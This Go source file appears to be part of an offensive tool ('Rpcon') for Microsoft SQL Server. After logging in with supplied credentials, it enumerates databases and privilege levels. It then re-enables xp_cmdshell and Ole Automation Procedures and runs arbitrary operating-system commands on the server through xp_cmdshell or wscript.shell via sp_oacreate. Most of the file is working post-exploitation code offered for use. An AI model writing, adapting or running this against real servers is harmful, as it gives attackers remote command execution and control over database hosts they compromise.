package cmdpackage

import (
	"Rpcon/common"
	"Rpcon/pkg"
	"database/sql"
	"fmt"
	_ "github.com/denisenkom/go-mssqldb"
	"log"
)

var cfgquery = []string{"select @@VERSION",
	"SELECT name FROM MASter..SysDatabASes ORDER BY name",
	"select IS_SRVROLEMEMBER('sysadmin')",
	"select IS_MEMBER('db_owner')",
	"select is_srvrolemember('public')",
	"SELECT SysObjects.name AS Tablename FROM sysobjects WHERE xtype = 'U' and sysstat<200",
	"select count(*) from master.dbo.sysobjects where xtype='x' and name='xp_cmdshell'",  //查看cmdshell状态
	"select count(*) from master.dbo.sysobjects where xtype='x' and name='SP_OACREATE';", //查看sp_oacreate状态 1存在
}
var msexp = []string{
	";EXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell', 1;RECONFIGURE;--",            //开启cmdshell
	"exec sp_configure 'show advanced options',1;reconfigure;exec sp_configure 'Ole Automation Procedures',1;reconfigure;--", //开启OLE 无回显
}

func Msscon() (*sql.DB, error) {
	dns := fmt.Sprintf("server=%s;port%d;database=%s;user id=%s;password=%s", common.Host, common.Port, common.DBname, common.User, common.Password)
	if isdebug {
		fmt.Println(dns)
	}
	conn, err := sql.Open("mssql", dns)
	if err != nil {
		log.Fatal("Open Connection failed:", err.Error())
	}
	return conn, err
}

func Mssquery() {
	conn, err := Msscon()
	if err != nil {
		fmt.Println(err)
	}
	stmt, err := conn.Prepare(`SELECT SysObjects.name AS Tablename FROM sysobjects WHERE xtype = 'U' and sysstat<200`)
	if err != nil {
		log.Fatal("Prepare failed:", err.Error())
	}
	defer stmt.Close()
	//通过Statement执行查询
	rows, err := stmt.Query()
	if err != nil {
		log.Fatal("Query failed:", err.Error())
	}

	//建立一个列数组
	cols, err := rows.Columns()
	var colsdata = make([]interface{}, len(cols))
	for i := 0; i < len(cols); i++ {
		colsdata[i] = new(interface{})
		fmt.Print(cols[i])
		fmt.Print("\t")
	}
	fmt.Println()

	//遍历每一行
	for rows.Next() {
		rows.Scan(colsdata...) //将查到的数据写入到这行中
		pkg.PrintRow(colsdata) //打印此行
	}
	defer rows.Close()
	defer func() { defer conn.Close() }()
}

func Msscfg() {
	conn, err := Msscon()
	if err != nil {
		fmt.Println(err)
	}
	for i := range cfgquery {
		stmt, err := conn.Prepare(cfgquery[i])
		if err != nil {
			log.Fatal("Prepare failed:", err.Error())
		}
		defer stmt.Close()
		//通过Statement执行查询
		rows, err := stmt.Query()
		if err != nil {
			log.Fatal("Query failed:", err.Error())
		}

		//建立一个列数组
		cols, err := rows.Columns()
		var colsdata = make([]interface{}, len(cols))
		for i := 0; i < len(cols); i++ {
			colsdata[i] = new(interface{})
			fmt.Print(cols[i])
			fmt.Print("\t")
		}
		fmt.Println()

		//遍历每一行
		for rows.Next() {
			rows.Scan(colsdata...) //将查到的数据写入到这行中
			pkg.PrintRow(colsdata) //打印此行
		}
		defer rows.Close()
	}
	defer func() { conn.Close() }()
}

func Cmdshell() {
	conn, err := Msscon()
	if err != nil {
		fmt.Println(err)
	}
	conn.Query(";EXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell', 1;RECONFIGURE;--")
	Code := fmt.Sprintf("exec master..xp_cmdshell '%v'", common.Code)
	stmt, err := conn.Prepare(Code)
	if err != nil {
		log.Fatal("Prepare failed:", err.Error())
	}
	defer stmt.Close()
	//通过Statement执行查询
	rows, err := stmt.Query()
	if err != nil {
		log.Fatal("Query failed:", err.Error())
	}

	//建立一个列数组
	cols, err := rows.Columns()
	var colsdata = make([]interface{}, len(cols))
	for i := 0; i < len(cols); i++ {
		colsdata[i] = new(interface{})
		fmt.Print(cols[i])
		fmt.Print("\t")
	}
	fmt.Println()

	//遍历每一行
	for rows.Next() {
		rows.Scan(colsdata...) //将查到的数据写入到这行中
		pkg.PrintRow(colsdata) //打印此行
	}
	defer rows.Close()
	defer func() { conn.Close() }()
}

func Oleshell() {
	conn, err := Msscon()
	if err != nil {
		fmt.Println(err)
	}
	conn.Query("exec sp_configure 'show advanced options',1;reconfigure;exec sp_configure 'Ole Automation Procedures',1;reconfigure;--")
	Code := fmt.Sprintf("declare @shell int exec sp_oacreate 'wscript.shell',@shell output exec sp_oamethod @shell,'run',null,'c:\\windows\\system32\\cmd.exe /c %v >c:\\\\1.txt'", common.Code)
	stmt, err := conn.Prepare(Code)
	if err != nil {
		log.Fatal("Prepare failed:", err.Error())
	}
	defer stmt.Close()
	//通过Statement执行查询
	rows, err := stmt.Query()
	if err != nil {
		log.Fatal("Query failed:", err.Error())
	}

	//建立一个列数组
	cols, err := rows.Columns()
	var colsdata = make([]interface{}, len(cols))
	for i := 0; i < len(cols); i++ {
		colsdata[i] = new(interface{})
		fmt.Print(cols[i])
		fmt.Print("\t")
	}
	fmt.Println()

	//遍历每一行
	for rows.Next() {
		rows.Scan(colsdata...) //将查到的数据写入到这行中
		pkg.PrintRow(colsdata) //打印此行
	}
	defer rows.Close()
	defer func() { conn.Close() }()
}

func CLR() {
	conn, err := Msscon()
	if err != nil {
		fmt.Println(err)
	}
	conn.Query("exec sp_configure 'show advanced options',1;reconfigure;exec sp_configure 'Ole Automation Procedures',1;reconfigure;--")

}
